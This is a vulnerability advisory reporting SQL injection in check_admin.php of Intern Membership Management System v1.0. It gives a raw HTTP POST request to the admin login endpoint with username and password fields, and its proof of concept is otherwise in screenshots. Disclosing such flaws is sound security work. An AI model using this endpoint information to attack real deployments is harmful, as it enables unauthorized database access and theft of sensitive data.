#  Intern Membership Management System check_admin.php sql injection

## NAME OF AFFECTED PRODUCT(S)

Intern Membership Management System

## Vendor Homepage

https://code-projects.org/intern-membership-management-system-in-php-with-source-code/

## Vulnerable File

check_admin.php

## VERSION(S)

v1.0

## Vulnerability Type

SQL injection

## DESCRIPTION

There is a SQL injection vulnerability in the check_admin.php file of the Intern Membership Management System project, which can be exploited by attackers to obtain sensitive data information

## Vulnerability details and POC

![image-20260107002123387](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107002123387.2yyu6c9de9.webp)

![image-20260107002136148](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107002136148.2h8shr7ztc.webp)

Data packet：

```
POST /intern/admin/check_admin.php HTTP/1.1
Host: localhost
Content-Length: 29
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/intern/admin/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=67l3m5trr6l48dkoe6lsb3g72i
Connection: keep-alive

username=admin&password=admin
```

![image-20260107002148609](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107002148609.9kgnxddfda.webp)
